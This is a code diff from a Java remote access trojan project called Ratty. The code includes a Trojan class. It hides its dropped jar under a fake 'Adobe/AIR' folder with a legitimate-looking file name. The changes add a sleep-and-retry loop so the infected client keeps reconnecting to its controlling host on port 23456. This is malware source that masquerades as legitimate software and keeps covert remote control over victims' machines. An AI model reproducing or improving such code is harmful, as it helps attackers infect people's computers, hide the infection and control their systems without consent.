@@ -17,12 +17,15 @@ import de.sogomn.rat.server.gui.RattyGuiController;
 
 public final class Ratty {
 	
+	private static final int DISCONNECT_SLEEP_INTERVAL = 2500;
+	
+	private static final String FOLDER_NAME = "Adobe" + File.separator + "AIR";
+	private static final String FILE_NAME = "jre13v3bridge.jar";
+	
 	public static final String ADDRESS = "localhost";
 	public static final int PORT = 23456;
 	public static final boolean CLIENT = false;
 	public static final String VERSION = "1.0";
-	public static final String FOLDER_NAME = "Adobe" + File.separator + "AIR";
-	public static final String FILE_NAME = "jre13v3bridge.jar";
 	
 	private Ratty() {
 		//...
@@ -49,7 +52,14 @@ public final class Ratty {
 		final Trojan trojan = new Trojan();
 		
 		if (!newClient.isOpen()) {
-			connectToHost(address, port);
+			try {
+				Thread.sleep(DISCONNECT_SLEEP_INTERVAL);
+				System.gc();
+			} catch (final InterruptedException ex) {
+				ex.printStackTrace();
+			} finally {
+				connectToHost(address, port);
+			}
 			
 			return;
 		}
@@ -68,7 +78,6 @@ public final class Ratty {
 	}
 	
 	public static void main(final String[] args) {
-		//setLookAndFeel();
 		WebLookAndFeel.install();
 		
 		if (CLIENT) {
